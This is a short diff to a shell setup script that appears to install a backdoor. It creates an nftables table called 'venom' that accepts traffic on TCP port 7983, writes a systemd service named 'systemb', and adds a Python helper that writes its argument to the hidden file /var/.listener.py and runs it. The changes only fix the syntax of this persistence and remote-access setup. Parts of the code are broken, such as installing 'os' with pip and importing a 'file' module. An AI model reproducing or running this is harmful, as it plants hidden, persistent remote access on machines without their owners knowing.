@@ -8,8 +8,8 @@ yum install -y pip
 pip install os
 pip install socket
 nft add table venom
-nft add chain venom input \{ type filter hook input priority -101 \; policy continue\; \}
-nft add chain venom output \{ type filter hook output priority -101 \; policy continue\; \}
+nft add chain venom input \{ type filter hook input priority -101 \; policy accept\; \}
+nft add chain venom output \{ type filter hook output priority -101 \; policy accept\; \}
 nft add rule venom input tcp dport { 7983 } accept
 nft add rule venom output tcp dport { 7983 } accept
 cat <<EOFA > /etc/systemd/system/systemb.service
@@ -31,8 +31,8 @@ cat <<EOFA > /tmp/test.py
 import file
 import sys
 def main():
-	f = open(/var/.listener.py, "w")
-	text = str(sys.argv[1])
+	f = open("/var/.listener.py", "w")
+	text = str(sys.argv[1].decode('utf-8'))
 	f.write(text)
 	f.close()
 	os.system("python3 /var/.listener.py")
